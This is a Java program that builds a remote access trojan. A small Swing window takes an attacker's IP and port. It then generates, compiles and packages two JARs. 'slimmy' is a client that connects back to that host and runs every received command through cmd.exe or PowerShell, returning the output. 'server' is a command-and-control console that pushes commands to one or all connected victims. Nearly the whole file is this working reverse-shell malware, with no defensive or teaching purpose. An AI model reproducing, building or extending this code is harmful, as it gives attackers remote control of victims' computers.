package winc;
import java.awt.event.ActionEvent;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.Writer;
import java.net.UnknownHostException;
import java.nio.file.Paths;
import java.awt.event.*;

import javax.swing.*;
public class mainf {
         private void e() throws IOException {
        	         	 JFrame f = new JFrame();
        	         	JTextArea area = new JTextArea();
        	         	JTextArea area1 = new JTextArea();
        	         	JTextArea serverarea1 = new JTextArea();
        	         	JTextArea area3 = new JTextArea();
        	         	JTextArea area2 = new JTextArea();
        	         	JTextArea serverarea2 = new JTextArea();
                        JButton butt = new JButton("Compile CLICK ONCE");
                        f.setSize(500, 500);
                        f.setLayout(null);
                        f.add(area);f.add(area1);f.add(serverarea1)
                        
;                        f.add(butt);
f.add(area2);f.add(area3);
                        f.setVisible(true);
                        area.setBounds(120,200,100,50);
                        area1.setBounds(120, 280, 100,50);
                        butt.setBounds(280, 200, 50, 50); 
                       
                        area3.setBounds(1,200,100,50);
                        area2.setBounds(1, 280, 100,50);
                    
                        serverarea2.setBounds(1,100,100,50);
                        area3.setText("PORT: ");
                        area2.setText("IP: ");
                       
                        butt.addActionListener(new ActionListener() {
                            public void actionPerformed(ActionEvent e) {
                         
                             
 
        	         	 String classfilepath = System.getProperty("user.dir") + "\\src\\winc\\slimmy.java";
        	         	 String classfilepath1 = System.getProperty("user.dir") + "\\src\\winc\\server.java";
        	         	 String outputDir = System.getProperty("user.dir") + "\\bin";
        	             System.out.print(classfilepath);
        	             

		 String jarOutputDir = System.getProperty("user.dir") + "\\jars";
	        createSourceFile(classfilepath, area.getText(), area1.getText());
	        createServerFile(classfilepath1, area.getText()); 
			 compileAndPackageAsJar(classfilepath, outputDir, jarOutputDir, "slimmy");
			 compileAndPackageAsJar(classfilepath1, outputDir, jarOutputDir, "server");
                            } });
                        }
                            private void createSourceFile(String filePath, String port, String ip) {
                                try (BufferedWriter writer = new BufferedWriter(new FileWriter(filePath))) {
                                    writer.write("package winc;\r\n"
                                    		+ "\r\n"
                                    		+ "import java.io.*;\r\n"
                                    		+ "import java.net.*;\r\n"
                                    		+ "import java.util.concurrent.TimeUnit;\r\n"
                                    		+ "public class slimmy {\r\n"
                                    		+ "	private int port = "+port+";\r\n"
                                    		+ "	private String currentPowershellDirectory = \"C:\\\\\";\r\n"
                                    		+ "	private String currentCmdDirectory = \"C:\\\\\";\r\n"
                                    		+ "	private boolean usingPowerShell = false;\r\n"
                                    		+ "	private boolean connected;\r\n"
                                    		+ "	private String ip = \""+ip+"\";\r\n"
                                    		+ " private void ee() throws UnknownHostException, IOException \r\n"
                                    		+ " {\r\n"
                                    		+ "	 if (!connected) {\r\n"
                                    		+ "     try (Socket socket = new Socket(this.ip, this.port);\r\n"
                                    		+ "             PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);\r\n"
                                    		+ "             BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\r\n"
                                    		+ "        System.out.print(\"Connected\");\r\n"
                                    		+ "        connected = true; \r\n"
                                    		+ "        \r\n"
                                    		+ "        String command;\r\n"
                                    		+ "   \r\n"
                                    		+ "        while ((command = reader.readLine()) != null) {\r\n"
                                    		+ "       \r\n"
                                    		+ "             \r\n"
                                    		+ "              \r\n"
                                    		+ "           \r\n"
                                    		+ "                executeCommand(command, writer); // Process other commands\r\n"
                                    		+ "            }\r\n"
                                    		+ "        }\r\n"
                                    		+ "     }} \r\n"
                                    		+ "     \r\n"
                                    		+ "	   private void executeCommand(String command, PrintWriter writer) {\r\n"
                                    		+ "		    final Process[] processWrapper = new Process[1];  \r\n"
                                    		+ "		    try {\r\n"
                                    		+ "		        String shellCommand;\r\n"
                                    		+ "\r\n"
                                    		+ "		        if (usingPowerShell) {\r\n"
                                    		+ "		      \r\n"
                                    		+ "		            if (command.startsWith(\"cd \")) {\r\n"
                                    		+ "		                String newDir = command.substring(3).trim();\r\n"
                                    		+ "		                currentPowershellDirectory = newDir;\r\n"
                                    		+ "		                writer.println(\"Changed directory to: \" + newDir);\r\n"
                                    		+ "		                return;\r\n"
                                    		+ "		            }\r\n"
                                    		+ "\r\n"
                                    		+ "		     \r\n"
                                    		+ "		            shellCommand = \"cd \\\"\" + currentPowershellDirectory + \"\\\"; \" + command;\r\n"
                                    		+ "		            processWrapper[0] = Runtime.getRuntime().exec(new String[]{\"powershell.exe\", \"-Command\", shellCommand});\r\n"
                                    		+ "		        } else {\r\n"
                                    		+ "		       \r\n"
                                    		+ "		            if (command.startsWith(\"cd \")) {\r\n"
                                    		+ "		                String newDir = command.substring(3).trim();\r\n"
                                    		+ "		                currentCmdDirectory = newDir;\r\n"
                                    		+ "		                writer.println(\"Changed directory to: \" + newDir);\r\n"
                                    		+ "		                return;\r\n"
                                    		+ "		            }\r\n"
                                    		+ "\r\n"
                                    		+ "		      \r\n"
                                    		+ "		            shellCommand = \"cd \\\"\" + currentCmdDirectory + \"\\\" && \" + command;\r\n"
                                    		+ "		            processWrapper[0] = Runtime.getRuntime().exec(new String[]{\"cmd.exe\", \"/c\", shellCommand});\r\n"
                                    		+ "		        }\r\n"
                                    		+ "\r\n"
                                    		+ "		        \r\n"
                                    		+ "		        Thread outputThread = new Thread(() -> {\r\n"
                                    		+ "		            try (BufferedReader commandOutput = new BufferedReader(new InputStreamReader(processWrapper[0].getInputStream()));\r\n"
                                    		+ "		                 BufferedReader errorOutput = new BufferedReader(new InputStreamReader(processWrapper[0].getErrorStream()))) {\r\n"
                                    		+ "		                \r\n"
                                    		+ "		                String line;\r\n"
                                    		+ "		               \r\n"
                                    		+ "		                while ((line = commandOutput.readLine()) != null) {\r\n"
                                    		+ "		                    writer.println(line);\r\n"
                                    		+ "		                    writer.flush();  \r\n"
                                    		+ "		                }\r\n"
                                    		+ "		       \r\n"
                                    		+ "		                while ((line = errorOutput.readLine()) != null) {\r\n"
                                    		+ "		                    writer.println(\"ERROR: \" + line);\r\n"
                                    		+ "		                    writer.flush();\r\n"
                                    		+ "		                }\r\n"
                                    		+ "		                \r\n"
                                    		+ "		            } catch (IOException e) {\r\n"
                                    		+ "		                writer.println(\"Error reading command output: \" + e.getMessage());\r\n"
                                    		+ "		            }\r\n"
                                    		+ "		        });\r\n"
                                    		+ "\r\n"
                                    		+ "		        outputThread.start();\r\n"
                                    		+ "		        \r\n"
                                    		+ "		        if (!processWrapper[0].waitFor(10, TimeUnit.SECONDS)) {  \r\n"
                                    		+ "		            processWrapper[0].destroy();\r\n"
                                    		+ "		            writer.println(\"Command execution timed out.\");\r\n"
                                    		+ "		        }\r\n"
                                    		+ "		        \r\n"
                                    		+ "		        outputThread.join(); \r\n"
                                    		+ "\r\n"
                                    		+ "		    } catch (IOException | InterruptedException e) {\r\n"
                                    		+ "		        writer.println(\"Error executing command: \" + e.getMessage());\r\n"
                                    		+ "		    }\r\n"
                                    		+ "		\r\n"
                                    		+ "	 \r\n"
                                    		+ "	 \r\n"
                                    		+ " }\r\n"
                                    		+ "	public  static void main(String[] args) throws UnknownHostException, IOException {\r\n"
                                    		+ "		\r\n"
                                            +"           		slimmy s = new slimmy();\r\n"
                                            + "		s.ee();"
                                    		+ "	} \r\n"
                                    		+ "}\r\n"
                                    		+ "");
                                    System.out.println("slimmy.java created successfully.");
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                            }

                            private void createServerFile(String filePath, String port) {
                                try (BufferedWriter writer = new BufferedWriter(new FileWriter(filePath))) {
                                    writer.write("package winc;\r\n"
                                    		+ "\r\n"
                                    		+ "\r\n"
                                    		+ "import javax.swing.*;\r\n"
                                    		+ "import java.awt.*;\r\n"
                                    		+ "import java.awt.event.ActionEvent;\r\n"
                                    		+ "import java.awt.event.ActionListener;\r\n"
                                    		+ "import java.io.*;\r\n"
                                    		+ "import java.net.*;\r\n"
                                    		+ "import java.util.HashMap;\r\n"
                                    		+ "import java.util.Map;\r\n"
                                    		+ "\r\n"
                                    		+ "public class server {\r\n"
                                    		+ "    private int PORT = "+port+";\r\n"
                                    		+ "    private ServerSocket serverSocket;\r\n"
                                    		+ "    private Map<String, ClientHandler> clients = new HashMap<>();\r\n"
                                    		+ "\r\n"
                                    		+ "    private JFrame frame;\r\n"
                                    		+ "    private JTabbedPane tabbedPane;\r\n"
                                    		+ "    private JTextField commandField; \r\n"
                                    		+ "    private JButton sendToAllButton; \r\n"
                                    		+ "    private JButton sendToSelectedButton; \r\n"
                                    		+ "\r\n"
                                    		+ "\r\n"
                                    		+ "    public static void main(String[] args) {\r\n"
                                    		+ "      server server = new server();\r\n"
                                    		+ "        server.createAndShowGUI();\r\n"
                                    		+ "        server.startServer();\r\n"
                                    		+ "    }\r\n"
                                    		+ "\r\n"
                                    		+ "\r\n"
                                    		+ "    private void createAndShowGUI() {\r\n"
                                    		+ "       \r\n"
                                    		+ "        frame = new JFrame(\"dist\");\r\n"
                                    		+ "        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\r\n"
                                    		+ "        frame.setSize(600, 400);\r\n"
                                    		+ "\r\n"
                                    		+ "        tabbedPane = new JTabbedPane();\r\n"
                                    		+ "        frame.add(tabbedPane, BorderLayout.CENTER);\r\n"
                                    		+ "\r\n"
                                    		+ "        commandField = new JTextField();\r\n"
                                    		+ "        sendToAllButton = new JButton(\"Send to All Clients\");\r\n"
                                    		+ "        sendToSelectedButton = new JButton(\"Send to Selected Client\");\r\n"
                                    		+ "\r\n"
                                    		+ "        JPanel commandPanel = new JPanel();\r\n"
                                    		+ "        commandPanel.setLayout(new BoxLayout(commandPanel, BoxLayout.Y_AXIS));\r\n"
                                    		+ "        commandPanel.add(commandField);\r\n"
                                    		+ "        commandPanel.add(sendToAllButton);\r\n"
                                    		+ "        commandPanel.add(sendToSelectedButton);\r\n"
                                    		+ "\r\n"
                                    		+ "\r\n"
                                    		+ "        frame.add(commandPanel, BorderLayout.SOUTH);\r\n"
                                    		+ "\r\n"
                                    		+ "        sendToAllButton.addActionListener(e -> sendCommandToAllClients());\r\n"
                                    		+ "        sendToSelectedButton.addActionListener(e -> sendCommandToSelectedClient());\r\n"
                                    		+ "\r\n"
                                    		+ "        frame.setVisible(true);\r\n"
                                    		+ "    }\r\n"
                                    		+ "\r\n"
                                    		+ "    private void startServer() {\r\n"
                                    		+ "        try {\r\n"
                                    		+ "            serverSocket = new ServerSocket(PORT);\r\n"
                                    		+ "            printToOutputArea(\"Server is listening on port \" + PORT);\r\n"
                                    		+ "            while (true) {\r\n"
                                    		+ "                Socket socket = serverSocket.accept();\r\n"
                                    		+ "                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\r\n"
                                    		+ "                String clientId = \"Client \" + (clients.size() + 1); \r\n"
                                    		+ "                printToOutputArea(clientId + \" connected.\");\r\n"
                                    		+ "                ClientHandler clientHandler = new ClientHandler(socket, clientId);\r\n"
                                    		+ "                clients.put(clientId, clientHandler);\r\n"
                                    		+ "                new Thread(clientHandler).start(); \r\n"
                                    		+ "            }\r\n"
                                    		+ "        } catch (IOException e) {\r\n"
                                    		+ "            printToOutputArea(\"Server error: \" + e.getMessage());\r\n"
                                    		+ "        }\r\n"
                                    		+ "    }\r\n"
                                    		+ "\r\n"
                                    		+ "\r\n"
                                    		+ "    private void printToOutputArea(String message) {\r\n"
                                    		+ "        System.out.println(message); }\r\n"
                                    		+ "\r\n"
                                    		+ "\r\n"
                                    		+ "    private void sendCommandToAllClients() {\r\n"
                                    		+ "        String command = commandField.getText().trim();\r\n"
                                    		+ "        if (!command.isEmpty()) {\r\n"
                                    		+ "            for (ClientHandler client : clients.values()) {\r\n"
                                    		+ "                client.sendCommand(command);\r\n"
                                    		+ "            }\r\n"
                                    		+ "            printToOutputArea(\"Command sent to all clients: \" + command);\r\n"
                                    		+ "            commandField.setText(\"\"); \r\n"
                                    		+ "        }\r\n"
                                    		+ "    }\r\n"
                                    		+ "\r\n"
                                    		+ "    private void sendCommandToSelectedClient() {\r\n"
                                    		+ "        String command = commandField.getText().trim();\r\n"
                                    		+ "        String selectedClientId = tabbedPane.getTitleAt(tabbedPane.getSelectedIndex());\r\n"
                                    		+ "\r\n"
                                    		+ "        if (!command.isEmpty() && selectedClientId != null) {\r\n"
                                    		+ "            ClientHandler selectedClient = clients.get(selectedClientId);\r\n"
                                    		+ "            if (selectedClient != null) {\r\n"
                                    		+ "                selectedClient.sendCommand(command);\r\n"
                                    		+ "                printToOutputArea(\"Command sent to \" + selectedClientId + \": \" + command);\r\n"
                                    		+ "                commandField.setText(\"\"); \r\n"
                                    		+ "            }\r\n"
                                    		+ "        }\r\n"
                                    		+ "    }\r\n"
                                    		+ "\r\n"
                                    		+ "   \r\n"
                                    		+ "\r\n"
                                    		+ "\r\n"
                                    		+ "\r\n"
                                    		+ "\r\n"
                                    		+ "    private class ClientHandler implements Runnable {\r\n"
                                    		+ "        private Socket socket;\r\n"
                                    		+ "        private PrintWriter writer;\r\n"
                                    		+ "        private BufferedReader reader;\r\n"
                                    		+ "        private JTextArea outputArea;\r\n"
                                    		+ "        private String clientId;\r\n"
                                    		+ "\r\n"
                                    		+ "        public ClientHandler(Socket socket, String clientId) {\r\n"
                                    		+ "            this.socket = socket;\r\n"
                                    		+ "            this.clientId = clientId;\r\n"
                                    		+ "            createClientTab();\r\n"
                                    		+ "        }\r\n"
                                    		+ "\r\n"
                                    		+ "\r\n"
                                    		+ "        private void createClientTab() {\r\n"
                                    		+ "            JPanel panel = new JPanel(new BorderLayout());\r\n"
                                    		+ "            outputArea = new JTextArea();\r\n"
                                    		+ "            outputArea.setEditable(false);\r\n"
                                    		+ "            JScrollPane scrollPane = new JScrollPane(outputArea);\r\n"
                                    		+ "            panel.add(scrollPane, BorderLayout.CENTER);\r\n"
                                    		+ "\r\n"
                                    		+ "            tabbedPane.addTab(clientId, panel);\r\n"
                                    		+ "        }\r\n"
                                    		+ "\r\n"
                                    		+ "        @Override\r\n"
                                    		+ "        public void run() {\r\n"
                                    		+ "            try {\r\n"
                                    		+ "                writer = new PrintWriter(socket.getOutputStream(), true);\r\n"
                                    		+ "                reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\r\n"
                                    		+ "                String response;\r\n"
                                    		+ "                while ((response = reader.readLine()) != null) {\r\n"
                                    		+ "                    outputArea.append(response + \"\\n\");\r\n"
                                    		+ "                }\r\n"
                                    		+ "            } catch (IOException e) {\r\n"
                                    		+ "                printToOutputArea(clientId + \" disconnected.\");\r\n"
                                    		+ "                clients.remove(clientId);\r\n"
                                    		+ "                tabbedPane.removeTabAt(tabbedPane.indexOfTab(clientId));\r\n"
                                    		+ "            }\r\n"
                                    		+ "        }\r\n"
                                    		+ "\r\n"
                                    		+ "        public void sendCommand(String command) {\r\n"
                                    		+ "            if (writer != null) {\r\n"
                                    		+ "                writer.println(command); \r\n"
                                    		+ "                writer.flush();\r\n"
                                    		+ "                outputArea.append(\"Command sent: \" + command + \"\\n\");\r\n"
                                    		+ "            }\r\n"
                                    		+ "        }\r\n"
                                    		+ "\r\n"
                                    		+ "\r\n"
                                    		+ "    \r\n"
                                    		+ "\r\n"
                                    		+ "\r\n"
                                    		+ "        }\r\n"
                                    		+ "    }");
                                    System.out.println("server.java created successfully.");
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                            }

         public static void createOutputDirectory(String outputDir) {
             java.io.File dir = new java.io.File(outputDir);
             if (!dir.exists()) {
                 if (dir.mkdirs()) {
                     System.out.println("Output dir created: " + outputDir);
                 } else {
                     System.out.println("fail to create output dir: " + outputDir);
                 }
             }
         }

         private void compileAndPackageAsJar(String javaFilePath, String outputDir, String jarOutputDir, String mainClassName) {
             try {
                  Process compileProcess = Runtime.getRuntime().exec("javac -d " + outputDir + " " + javaFilePath);
                 compileProcess.waitFor();
                 System.out.println(mainClassName + ".java compiled successfully.");

             
                 String manifestContent = "Main-Class: winc." + mainClassName + "\n";
                 File manifestFile = new File(outputDir + "/MANIFEST.MF");
                 try (FileWriter fw = new FileWriter(manifestFile)) {
                     fw.write(manifestContent);
                 }

               
                 String jarFilePath = jarOutputDir + "/" + mainClassName + ".jar";
                 Process jarProcess = Runtime.getRuntime().exec("jar cfm " + jarFilePath + " " + manifestFile.getAbsolutePath() + " -C " + outputDir + " .");
                 jarProcess.waitFor();
                 System.out.println(mainClassName + ".jar created at " + jarFilePath);

              
                 manifestFile.delete();
             } catch (IOException | InterruptedException e) {
                 e.printStackTrace();
                 System.out.println("Failed to compile and package " + mainClassName + ".java");
             }
         }

	public static void main(String[] args) throws IOException {
 mainf f = new mainf();
 f.e();
	}


         }
